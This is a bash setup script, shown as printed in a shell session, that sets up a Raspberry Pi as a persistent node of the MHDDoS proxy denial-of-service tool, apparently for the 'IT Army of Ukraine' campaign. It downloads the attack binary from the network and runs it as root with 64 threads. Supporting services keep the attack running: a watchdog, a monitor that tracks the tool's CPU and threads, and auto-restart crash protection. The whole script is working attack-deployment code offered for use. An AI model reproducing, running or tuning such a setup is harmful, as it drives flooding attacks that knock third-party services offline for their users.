@@ -1,0 +1,260 @@
+pi@IT-Army-Ukraine-4B-51:~ $ cat RPi4B-02242026_final_fixed 
+#!/usr/bin/env bash
+set -euo pipefail
+
+# For debugging
+exec > >(tee -a /var/log/mhddos/setup.log) 2>&1
+set -x
+echo "$(date -Is) Script started"
+
+# =========================
+# MHDDOS Raspberry Pi 4B Optimized Setup
+# =========================
+
+# ---- Tunables ----
+INSTALL_HARDENED_APP=1
+APP_NAME="mhddos_proxy_linux"
+APP_USER="pi"
+START_SCRIPT="${APP_NAME}-worker.sh"
+APP_EXECSTART="/usr/local/bin/${START_SCRIPT}"
+APP_ENV_FILE="/etc/default/${APP_NAME}"
+APP_WORKDIR="/opt/itarmy/bin"
+ITARMY_COPIES=1
+ITARMY_THREADS=64
+IFACE="wlan0"
+LOG_FILE="/var/log/mhddos/resource-monitor.log"
+CRASH_LOG="/var/log/mhddos/crash-protection.log"
+MAX_CRASHES=3
+MAX_NET_LATENCY=200
+
+# =========================
+# 1. Install MHDDOS Binary
+# =========================
+echo "==> Installing MHDDOS binary"
+sudo mkdir -p /opt/itarmy/bin
+sudo rm -f /opt/itarmy/bin/mhddos_proxy_linux
+sudo curl -fL --retry 3 --retry-delay 5 \
+  "https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64" \
+  -o /opt/itarmy/bin/mhddos_proxy_linux
+sudo chmod +x /opt/itarmy/bin/mhddos_proxy_linux
+sudo chown root:root /opt/itarmy/bin/mhddos_proxy_linux
+
+# =========================
+# 2. Create INI File
+# =========================
+echo "==> Creating INI file"
+sudo bash -c 'cat > /opt/itarmy/bin/mhddos.ini << "INI_EOF"
+copies = 1
+threads = 64
+INI_EOF'
+
+# =========================
+# 3. Create Systemd Service for MHDDOS
+# =========================
+echo "==> Creating systemd service for MHDDOS"
+sudo bash -c 'cat > /etc/systemd/system/mhddos_proxy_linux.service << "SERVICE_EOF"
+[Unit]
+Description=MHDDOS Proxy Service
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/opt/itarmy/bin
+ExecStart=/opt/itarmy/bin/mhddos_proxy_linux
+Restart=always
+RestartSec=5
+StandardOutput=syslog
+StandardError=syslog
+
+[Install]
+WantedBy=multi-user.target
+SERVICE_EOF'
+
+# =========================
+# 4. Create Net-Watchdog
+# =========================
+echo "==> Creating net-watchdog"
+sudo bash -c 'cat > /usr/local/bin/net-watchdog.sh << "WATCHDOG_EOF"
+#!/usr/bin/env bash
+set -euo pipefail
+IFACE="wlan0"
+MAX_NET_LATENCY=200
+
+check_network_quality() {
+    local gw
+    gw=\$(ip route | awk '\''/default/ {print \$3}'\'' | head -n 1)
+    if [[ -z "\$gw" ]]; then
+        echo "No default gateway found"
+        return 1
+    fi
+    local latency=\$(ping -c 3 -q "\$gw" 2>/dev/null | tail -1 | awk -F'\''/'\'' '\''{print \$5}'\'' | cut -d. -f1 || echo 0)
+    if [[ "\$latency" -gt "$MAX_NET_LATENCY" ]]; then
+        logger -t net-watchdog "High latency detected: \${latency}ms > ${MAX_NET_LATENCY}ms"
+        return 1
+    fi
+    return 0
+}
+
+main() {
+    if ! check_network_quality; then
+        systemctl restart NetworkManager
+        sleep 5
+    fi
+}
+main
+WATCHDOG_EOF'
+sudo chmod +x /usr/local/bin/net-watchdog.sh
+
+sudo bash -c 'cat > /etc/systemd/system/net-watchdog.service << "WATCHDOG_SERVICE_EOF"
+[Unit]
+Description=Network Watchdog
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/net-watchdog.sh
+Restart=on-failure
+RestartSec=10s
+StandardOutput=syslog
+StandardError=syslog
+
+[Install]
+WantedBy=multi-user.target
+WATCHDOG_SERVICE_EOF'
+
+# =========================
+# 5. Create Resource-Monitor
+# =========================
+echo "==> Creating resource-monitor"
+sudo mkdir -p /var/log/mhddos
+sudo bash -c 'cat > /usr/local/bin/resource-monitor.sh << "MONITOR_EOF"
+#!/usr/bin/env bash
+set -euo pipefail
+LOG_FILE="/var/log/mhddos/resource-monitor.log"
+
+get_metrics() {
+    local load=\$(uptime | awk -F"load average: " "{print \$2}" | awk "{print \$3}" | cut -d, -f1)
+    local cpu=\$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\\([0-9.]*\\)%* id.*/\\1/" | awk "{print 100 - \$1}")
+    local mem=\$(free | awk "/Mem:/ {printf \"%.0f\", \$3/\$2 * 100}")
+    local temp=\$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null | awk "{print \$1/1000}")
+    local latency=\$(ping -c 3 \$(ip route | awk "/default/ {print \$3}" | head -n 1) 2>/dev/null | tail -1 | awk -F"/" "{print \$5}" | cut -d. -f1 || echo 0)
+    local mhddos_pid=\$(pgrep -f "/opt/itarmy/bin/mhddos_proxy_linux" | head -1)
+    local mhddos_cpu="0"
+    local mhddos_mem="0"
+    local mhddos_threads="0"
+    if [[ -n "\$mhddos_pid" ]]; then
+        mhddos_cpu=\$(ps -p \$mhddos_pid -o %cpu | tail -1)
+        mhddos_mem=\$(ps -p \$mhddos_pid -o %mem | tail -1)
+        mhddos_threads=\$(ps -p \$mhddos_pid -o nlwp | tail -1)
+    fi
+    echo "\$(date -Is) Load=\$load, CPU=\$cpu%, MEM=\$mem%, Temp=\${temp}C, Latency=\${latency}ms, MHDDOS-CPU=\$mhddos_cpu%, MHDDOS-MEM=\$mhddos_mem%, MHDDOS-Threads=\$mhddos_threads" >> "\$LOG_FILE"
+}
+
+get_metrics
+MONITOR_EOF'
+sudo chmod +x /usr/local/bin/resource-monitor.sh
+
+sudo bash -c 'cat > /etc/systemd/system/resource-monitor.service << "MONITOR_SERVICE_EOF"
+[Unit]
+Description=Resource Monitor for MHDDOS
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/resource-monitor.sh
+Restart=on-failure
+RestartSec=10s
+StandardOutput=syslog
+StandardError=syslog
+
+[Install]
+WantedBy=multi-user.target
+MONITOR_SERVICE_EOF'
+
+# =========================
+# 6. Create Crash-Protection
+# =========================
+echo "==> Creating crash-protection"
+sudo bash -c 'cat > /usr/local/bin/crash-protection.sh << "CRASH_EOF"
+#!/usr/bin/env bash
+set -euo pipefail
+LOG_FILE="/var/log/mhddos/crash-protection.log"
+MAX_CRASHES=3
+CRASH_COUNT=0
+
+while true; do
+    if ! systemctl is-active --quiet mhddos_proxy_linux; then
+        CRASH_COUNT=\$((CRASH_COUNT + 1))
+        echo "\$(date -Is) MHDDOS crashed. Crash count: \$CRASH_COUNT" >> "\$LOG_FILE"
+        if [ "\$CRASH_COUNT" -ge "$MAX_CRASHES" ]; then
+            echo "\$(date -Is) Max crashes reached. Disabling MHDDOS." >> "\$LOG_FILE"
+            sudo systemctl stop mhddos_proxy_linux
+            sudo systemctl disable mhddos_proxy_linux
+            break
+        fi
+        echo "\$(date -Is) Restarting MHDDOS..." >> "\$LOG_FILE"
+        sudo systemctl restart mhddos_proxy_linux
+    fi
+    sleep 60
+done
+CRASH_EOF'
+sudo chmod +x /usr/local/bin/crash-protection.sh
+
+sudo bash -c 'cat > /etc/systemd/system/crash-protection.service << "CRASH_SERVICE_EOF"
+[Unit]
+Description=Crash Protection for MHDDOS
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/crash-protection.sh
+Restart=on-failure
+RestartSec=10s
+StandardOutput=syslog
+StandardError=syslog
+
+[Install]
+WantedBy=multi-user.target
+CRASH_SERVICE_EOF'
+
+# =========================
+# 7. Apply QoS Rules
+# =========================
+echo "==> Applying QoS rules"
+sudo tc qdisc del dev "$IFACE" root 2>/dev/null || true
+sudo tc qdisc add dev "$IFACE" root handle 1: htb default 30
+sudo tc class add dev "$IFACE" parent 1: classid 1:1 htb rate 100mbit
+sudo tc class add dev "$IFACE" parent 1:1 classid 1:10 htb rate 90mbit prio 1
+sudo tc class add dev "$IFACE" parent 1:1 classid 1:30 htb rate 10mbit prio 3
+sudo tc filter add dev "$IFACE" protocol ip parent 1:0 prio 1 u32 match ip dport 22 0xffff flowid 1:10
+sudo tc filter add dev "$IFACE" protocol ip parent 1:0 prio 3 u32 match ip dport 0 0xffff flowid 1:30
+
+# =========================
+# 8. Power Optimizations
+# =========================
+echo "==> Applying power optimizations"
+sudo systemctl disable bluetooth
+for led in /sys/class/leds/*/trigger; do
+    echo none | sudo tee "$led" > /dev/null
+done
+echo "auto" | sudo tee /sys/bus/usb/devices/usb1/power/control > /dev/null
+
+# =========================
+# 9. Enable and Start Services
+# =========================
+echo "==> Enabling and starting services"
+sudo systemctl daemon-reload
+sudo systemctl enable mhddos_proxy_linux net-watchdog resource-monitor crash-protection
+sudo systemctl start mhddos_proxy_linux net-watchdog resource-monitor crash-protection
+
+# =========================
+# 10. Verify
+# =========================
+echo "==> Verifying"
+systemctl status mhddos_proxy_linux net-watchdog resource-monitor crash-protection
+cat /opt/itarmy/bin/mhddos.ini
+tail -n 5 /var/log/mhddos/resource-monitor.log
+sudo tc -s qdisc ls dev "$IFACE"
+pi@IT-Army-Ukraine-4B-51:~ $ 
